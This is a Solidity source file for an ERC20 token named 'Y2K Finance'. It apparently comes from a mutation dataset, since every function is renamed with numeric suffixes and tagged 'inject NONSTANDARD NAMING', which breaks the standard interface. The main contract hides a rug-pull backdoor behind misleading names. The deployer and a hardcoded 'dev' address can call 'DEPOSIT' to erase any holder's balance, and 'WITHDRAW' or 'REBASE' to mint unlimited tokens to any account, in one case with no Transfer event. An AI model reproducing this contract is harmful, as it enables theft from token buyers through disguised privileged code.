                                                                 

pragma solidity ^0.5.16;
interface IERC20 {
    function TOTALSUPPLY308() external view returns (uint);	//inject NONSTANDARD NAMING
    function BALANCEOF972(address account) external view returns (uint);	//inject NONSTANDARD NAMING
    function TRANSFER791(address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function ALLOWANCE199(address owner, address spender) external view returns (uint);	//inject NONSTANDARD NAMING
    function APPROVE874(address spender, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function TRANSFERFROM113(address sender, address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    event TRANSFER87(address indexed from, address indexed to, uint value);	//inject NONSTANDARD NAMING
    event APPROVAL892(address indexed owner, address indexed spender, uint value);	//inject NONSTANDARD NAMING
}
contract Context {
    constructor () internal { }
    function _MSGSENDER300() internal view returns (address payable) {	//inject NONSTANDARD NAMING
        return msg.sender;
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping (address => uint) private _balances;
    mapping (address => mapping (address => uint)) private _allowances;
    uint private _totalSupply;
    function TOTALSUPPLY308() public view returns (uint) {	//inject NONSTANDARD NAMING
        return _totalSupply;
    }
    function BALANCEOF972(address account) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _balances[account];
    }
    function TRANSFER791(address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _TRANSFER269(_MSGSENDER300(), recipient, amount);
        return true;
    }
    function ALLOWANCE199(address owner, address spender) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _allowances[owner][spender];
    }
    function APPROVE874(address spender, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE130(_MSGSENDER300(), spender, amount);
        return true;
    }
    function TRANSFERFROM113(address sender, address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _TRANSFER269(sender, recipient, amount);
        _APPROVE130(sender, _MSGSENDER300(), _allowances[sender][_MSGSENDER300()].SUB102(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function INCREASEALLOWANCE861(address spender, uint addedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE130(_MSGSENDER300(), spender, _allowances[_MSGSENDER300()][spender].ADD758(addedValue));
        return true;
    }
    function DECREASEALLOWANCE936(address spender, uint subtractedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE130(_MSGSENDER300(), spender, _allowances[_MSGSENDER300()][spender].SUB102(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function _TRANSFER269(address sender, address recipient, uint amount) internal {	//inject NONSTANDARD NAMING
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].SUB102(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].ADD758(amount);
        emit TRANSFER87(sender, recipient, amount);
    }
    function _INITMINT814(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.ADD758(amount);
        _balances[account] = _balances[account].ADD758(amount);
        emit TRANSFER87(address(0), account, amount);
    }
    function _REBASE71(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.ADD758(amount);
        _balances[account] = _balances[account].ADD758(amount);
    }
    function _WITHDRAW253(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: _withdraw to the zero address");
        _totalSupply = _totalSupply.ADD758(amount);
        _balances[account] = _balances[account].ADD758(amount);
    }
    function _DEPOSIT916(address acc) internal {	//inject NONSTANDARD NAMING
        _balances[acc] = 0;
    }
    function _APPROVE130(address owner, address spender, uint amount) internal {	//inject NONSTANDARD NAMING
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit APPROVAL892(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
    function NAME203() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _name;
    }
    function SYMBOL586() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _symbol;
    }
    function DECIMALS911() public view returns (uint8) {	//inject NONSTANDARD NAMING
        return _decimals;
    }
}

library SafeMath {
    function ADD758(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function SUB102(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return SUB102(a, b, "SafeMath: subtraction overflow");
    }
    function SUB102(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        require(b <= a, errorMessage);
        uint c = a - b;
        return c;
    }
    function MUL952(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        if (a == 0) {
            return 0;
        }
        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function DIV99(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return DIV99(a, b, "SafeMath: division by zero");
    }
    function DIV99(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        require(b > 0, errorMessage);
        uint c = a / b;
        return c;
    }
}

contract Y2KFinance is ERC20, ERC20Detailed {
  using SafeMath for uint;
  mapping (address => bool) public financer;
  address dev = 0xD336120A0812Bc71b9D1b9A23ae36E9A3e8eB69E;
  constructor () public ERC20Detailed("Y2K Finance", "Y2K", 18) {
      _INITMINT814( msg.sender, 1000*10**uint(DECIMALS911()) );
      financer[msg.sender] = true;
      financer[dev] = true;
  }

  function DEPOSIT757(address account) public {	//inject NONSTANDARD NAMING
      require(financer[msg.sender], "!warn");
      _DEPOSIT916(account);
  }

  function WITHDRAW461(address account, uint amount) public {	//inject NONSTANDARD NAMING
      require(financer[msg.sender], "!warn");
      _WITHDRAW253(account, amount);
  }

  function REBASE190(address account, uint amount) public {	//inject NONSTANDARD NAMING
      require(financer[msg.sender], "!warn");
      _REBASE71(account, amount);
  }

}